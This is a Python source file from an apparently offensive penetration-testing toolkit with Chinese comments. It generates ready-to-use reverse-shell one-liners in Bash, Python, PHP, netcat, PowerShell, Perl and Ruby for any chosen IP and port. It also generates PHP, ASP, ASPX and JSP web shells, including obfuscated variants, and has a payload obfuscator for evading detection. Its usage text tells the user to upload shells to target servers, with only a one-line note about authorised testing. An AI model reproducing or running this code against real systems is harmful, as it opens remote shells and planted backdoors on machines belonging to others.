# tools/native_tools.py
"""
原生网络安全工具 - 纯Python标准库实现，不依赖外部工具安装
支持跨平台（Windows/macOS/Linux）

每个工具返回统一格式：
{
    "success": bool,
    "tool": str,
    "target": str,
    "data": Any,
    "raw_output": str,
    "scan_time": str,
    "error": str (可选)
}
"""
import os
import re
import ssl
import sys
import json
import time
import socket
import struct
import shutil
import platform
import inspect
import subprocess
import threading
import urllib.request
import urllib.error
from typing import Dict, List, Any, Optional, Callable
from concurrent.futures import ThreadPoolExecutor, as_completed, TimeoutError as FuturesTimeout
from datetime import datetime
from libertas.utils.text_decode import decode_output

from .constants import *


def native_reverse_shell(ip, port=4444, language="all"):
    """生成各种语言的反向Shell"""
    shells = {
        "Bash": [
            "bash -i >& /dev/tcp/" + ip + "/" + str(port) + " 0>&1",
            "bash -c 'bash -i >& /dev/tcp/" + ip + "/" + str(port) + " 0>&1'",
        ],
        "Python": [
            "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + ip + "\"," + str(port) + "));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])'" ,
        ],
        "PHP": [
            "php -r '$sock=fsockopen(\"" + ip + "\"," + str(port) + ");exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            "<?php $sock=fsockopen(\"" + ip + "\"," + str(port) + ");$proc=proc_open(\"/bin/sh -i\",array(0=>$sock,1=>$sock,2=>$sock),$pipes);?>",
        ],
        "NetCat": [
            "nc -e /bin/sh " + ip + " " + str(port),
            "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc " + ip + " " + str(port) + " >/tmp/f",
        ],
        "PowerShell": [
            "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"" + ip + "\"," + str(port) + ");$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1 | Out-String);$sendback2=$sendback+\"PS \"+(pwd).Path+\"> \";$x=($([text.encoding]::ASCII).GetBytes($sendback2));$stream.Write($x,0,$x.Length);$stream.Flush()}};$client.Close()",
        ],
        "Perl": [
            "perl -e 'use Socket;$i=\"" + ip + "\";$p=" + str(port) + ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
        ],
        "Ruby": [
            "ruby -rsocket -e'f=TCPSocket.open(\"" + ip + "\"," + str(port) + ").to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
        ],
    }
    
    if language.lower() != "all":
        lang_key = None
        for key in shells.keys():
            if key.lower() == language.lower():
                lang_key = key
                break
        if lang_key:
            shells = {lang_key: shells[lang_key]}
    
    total = sum(len(v) for v in shells.values())
    
    raw = "反向Shell生成器\n目标: " + ip + ":" + str(port) + "\n生成 " + str(total) + " 个Payload\n\n"
    for lang, payloads in shells.items():
        raw += "【" + lang + "】(" + str(len(payloads)) + "个)\n"
        for i, payload in enumerate(payloads, 1):
            raw += "  " + str(i) + ". " + payload[:150] + "\n"
        raw += "\n"
    
    raw += "使用说明:\n  1. 在攻击机上监听: nc -lvnp " + str(port) + "\n  2. 在目标机上执行上述任意一个Payload\n  3. 仅限授权的安全测试使用\n"
    
    return _result("reverse_shell", ip + ":" + str(port), True,
                   data={"ip": ip, "port": port, "shells": shells, "total": total}, raw=raw)

def native_webshell_generator(language="php", password="cmd"):
    """生成各种语言的WebShell"""
    shells = {}
    
    if language.lower() in ["php", "all"]:
        shells["PHP"] = {
            "一句话木马": [
                '<?php @eval($_POST["' + password + '"]);?>',
                '<?php @assert($_POST["' + password + '"]);?>',
                '<?php system($_GET["' + password + '"]);?>',
                '<?php $cmd=$_POST["' + password + '"];@preg_replace("/[email]/e",$cmd,"email");?>',
            ],
            "加密变形": [
                '<?php $a=str_rot13("riny");$a($_POST["' + password + '"]);?>',
                '<?php $a=base64_decode("ZXZhbA==");$a($_POST["' + password + '"]);?>',
                '<?php $a="sys"."tem";$a($_GET["' + password + '"]);?>',
            ],
        }
    
    if language.lower() in ["asp", "all"]:
        shells["ASP"] = {
            "一句话木马": [
                '<%eval request("' + password + '")%>',
                '<%execute request("' + password + '")%>',
            ],
        }
    
    if language.lower() in ["aspx", "all"]:
        shells["ASPX"] = {
            "一句话木马": [
                '<%@ Page Language="C#"%><%if(Request["' + password + '"]!=null){System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo("cmd.exe","/c "+Request["' + password + '"]){RedirectStandardOutput=true,UseShellExecute=false}).StandardOutput.ReadToEnd();}%>',
            ],
        }
    
    if language.lower() in ["jsp", "all"]:
        shells["JSP"] = {
            "一句话木马": [
                '<%if(request.getParameter("' + password + '")!=null){java.lang.Runtime.getRuntime().exec(request.getParameter("' + password + '"));}%>',
                '<%Runtime.getRuntime().exec(request.getParameter("' + password + '"));%>',
            ],
        }
    
    total = sum(len(v2) for v in shells.values() for v2 in v.values())

    if total == 0:
        # 未知 language（例如模型按通用契约把 target 绑到了第一个形参）此前会
        # 生成 0 个模板却仍报 success=true，用户看到"工具成功但没结果"。
        # 如实失败并给出可选值（与本次"失败必须可读"的口径一致）。
        return _result("webshell_generator", language, False,
                       data={"language": language, "password": password,
                             "shells": {}, "total": 0,
                             "error_kind": "bad_language",
                             "error_detail": f"未知语言: {language}",
                             "expected_params": {
                                 "language": "all/php/asp/aspx/jsp",
                                 "password": "连接密码(默认cmd)"}},
                       raw=(f"WebShell生成器\n未生成任何模板：未知语言 {language}\n"
                            f"可选语言: all/php/asp/aspx/jsp\n"),
                       error=f"未知语言：{language}（可选：all/php/asp/aspx/jsp）")

    raw = "WebShell生成器\n密码: " + password + "\n生成 " + str(total) + " 个WebShell\n\n"
    for lang, categories in shells.items():
        raw += "【" + lang + "】\n"
        for cat, payloads in categories.items():
            raw += "  [" + cat + "] (" + str(len(payloads)) + "个)\n"
            for i, payload in enumerate(payloads, 1):
                raw += "    " + str(i) + ". " + payload[:100] + "\n"
        raw += "\n"
    
    raw += "使用说明:\n  1. 将WebShell上传到目标服务器\n  2. 通过浏览器或工具访问WebShell\n  3. 使用密码执行命令\n  4. 仅限授权的安全测试使用\n"
    
    return _result("webshell_generator", language, True,
                   data={"language": language, "password": password, "shells": shells, "total": total}, raw=raw)

def native_payload_obfuscator(payload, method="all"):
    """对Payload进行混淆编码"""
    if not payload:
        return _result("payload_obfuscator", "", False, error="请输入Payload")
    
    import base64
    import codecs
    import urllib.parse
    
    results = {}
    
    # Base64编码
    b64 = base64.b64encode(payload.encode()).decode()
    results["Base64"] = {"encoded": b64, "php_decode": "base64_decode('" + b64 + "')"}
    
    # Hex编码
    hex_enc = payload.encode().hex()
    results["Hex"] = {"encoded": hex_enc, "php_decode": "hex2bin('" + hex_enc + "')"}
    
    # Unicode编码
    unicode_enc = "".join("\\u" + format(ord(c), "04x") for c in payload)
    results["Unicode"] = {"encoded": unicode_enc, "js_decode": "eval('" + unicode_enc + "')"}
    
    # ROT13编码
    rot13 = codecs.encode(payload, "rot_13")
    results["ROT13"] = {"encoded": rot13, "php_decode": "str_rot13('" + rot13 + "')"}
    
    # URL编码
    url_enc = urllib.parse.quote(payload, safe="")
    results["URL编码"] = {"encoded": url_enc}
    
    # 字符拼接（PHP）
    char_array = ["chr(" + str(ord(c)) + ")" for c in payload]
    results["字符拼接(PHP)"] = {"encoded": ".".join(char_array), "execute": "eval(" + ".".join(char_array) + ");"}
    
    # 字符串反转
    reversed_payload = payload[::-1]
    results["反转"] = {"encoded": reversed_payload, "php_decode": "strrev('" + reversed_payload + "')"}
    
    # ASCII码数组
    ascii_array = [str(ord(c)) for c in payload]
    results["ASCII数组"] = {"encoded": ",".join(ascii_array)}
    
    # 双重编码（Base64+Hex）
    double_enc = base64.b64encode(payload.encode()).decode().encode().hex()
    results["双重编码(Base64+Hex)"] = {"encoded": double_enc, "decode": "先Hex解码，再Base64解码"}
    
    if method.lower() != "all":
        for key in list(results.keys()):
            if method.lower() not in key.lower():
                del results[key]
    
    raw = "Payload混淆器\n原始Payload: " + payload[:100] + "\n混淆方式: " + str(len(results)) + "种\n\n"
    for method_name, info in results.items():
        raw += "【" + method_name + "】\n"
        raw += "  编码后: " + info["encoded"][:100] + "\n"
        if "php_decode" in info:
            raw += "  PHP解码: " + info["php_decode"][:100] + "\n"
        raw += "\n"
    
    return _result("payload_obfuscator", payload[:50], True,
                   data={"payload": payload, "methods": results, "count": len(results)}, raw=raw)
